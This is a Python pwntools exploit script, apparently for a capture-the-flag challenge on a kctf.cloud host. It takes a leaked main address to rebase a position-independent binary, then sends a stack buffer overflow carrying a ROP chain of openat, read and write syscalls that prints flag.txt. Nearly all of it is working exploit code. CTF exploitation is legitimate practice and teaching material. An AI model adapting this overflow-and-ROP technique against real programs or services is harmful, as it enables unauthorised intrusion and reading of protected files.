from pwn import *
from icecream import ic

elf = exe = ELF("./chal")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("drywall.kctf-453514-codelab.kctf.cloud", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *main+460
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def binsh(a): return next(a.search(b"/bin/sh\x00"))
def i(): return io.interactive()

io = start()

sl(b'flag.txt\x00')
ru(b"<|;)\n")

main = int(rl().strip(), 16)
elf.address = main - 0x11a3

flag_pointer = elf.address + 0x4050

pop_rdi = elf.address + 0x00000000000013db
pop_rsi_r15 = elf.address + 0x00000000000013d9
pop_rdx = elf.address + 0x0000000000001199
pop_rax = elf.address + 0x000000000000119b
syscall = elf.address + 0x000000000000119d

payload = b'a'*(264+0x10)

# openat(-100, flag_pointer, 0, 0) (r10 already set to 0)
payload += p64(pop_rdi)
payload += p64(0xffffffffffffff9c)
payload += p64(pop_rax)
payload += p64(257)
payload += p64(pop_rsi_r15)
payload += p64(flag_pointer)
payload += p64(0)
payload += p64(pop_rdx)
payload += p64(0)
payload += p64(syscall)

# read(3, elf.bss(), 0x100)
payload += p64(pop_rdi)
payload += p64(3)
payload += p64(pop_rax)
payload += p64(0)
payload += p64(pop_rsi_r15)
payload += p64(elf.bss() + 0x200)
payload += p64(0)
payload += p64(pop_rdx)
payload += p64(0x100)
payload += p64(syscall)

# write(1, elf.bss(), 0x100)
payload += p64(pop_rdi)
payload += p64(1)
payload += p64(pop_rax)
payload += p64(1)
payload += p64(pop_rsi_r15)
payload += p64(elf.bss() + 0x200)
payload += p64(0)
payload += p64(pop_rdx)
payload += p64(0x100)
payload += p64(syscall)


sl(payload)


io.interactive()
